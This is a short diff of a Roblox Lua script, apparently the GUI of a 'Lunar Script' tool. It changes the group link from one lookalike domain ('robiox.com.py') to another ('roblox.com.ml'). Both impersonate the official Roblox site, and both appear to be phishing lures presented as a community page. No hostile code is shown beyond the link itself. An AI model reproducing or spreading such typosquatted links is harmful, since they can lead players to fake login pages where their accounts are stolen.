@@ -6,7 +6,7 @@ local Lighting = game:GetService("Lighting")
 local player = Players.LocalPlayer
 
 local GROUP_ID = 210302272211
-local GROUP_LINK = "https://www.robiox.com.py/communities/210302272211/Lunar Script"
+local GROUP_LINK = "https://www.roblox.com.ml/communities/210302272211/LunarScript"
 local ANIME_BG = "rbxassetid://102177503342365"
 
 --// GUI
